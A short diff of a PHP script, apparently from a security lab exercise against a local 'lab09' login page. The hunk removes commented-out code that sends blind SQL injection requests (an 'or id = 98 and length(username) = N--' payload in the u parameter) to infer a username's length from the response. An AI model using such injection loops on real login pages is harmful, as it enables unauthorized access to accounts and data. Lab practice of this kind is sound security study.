@@ -112,68 +112,7 @@ for($id = 1; $id <= 100; $id++){
 		}   
 	}
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-/*Ceci marche
-$size = 0;
-while ($size < 25)
-{
-    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$size--%20";
-	$result = file_get_contents($url);
-	if (strpos($result, 'cat') !== false) {
-		echo "\n";
-		
-		break;
-	}else{
-		//echo "\n";
-		//echo "nope";
-	}
-
-	$size++;
-}
-
-echo 'size is ';
-print $size;
-
-for ($i = 1; $i <= $size; $i++) {
-    echo "The number is: $i <br>";
-} 
-*/
-
-
-
-
-
-
-
-
-
-/*$result = file_get_contents($url);
-
-print($result);
-
-
-if (strpos($result, 'cat') !== false) {
-	echo "\n";
-	echo 'true';
-}else{
-	echo "\n";
-	echo "nope";
-}*/
+fputs($monfichier, "\n");
 fclose($monfichier);
 echo "\n";
 
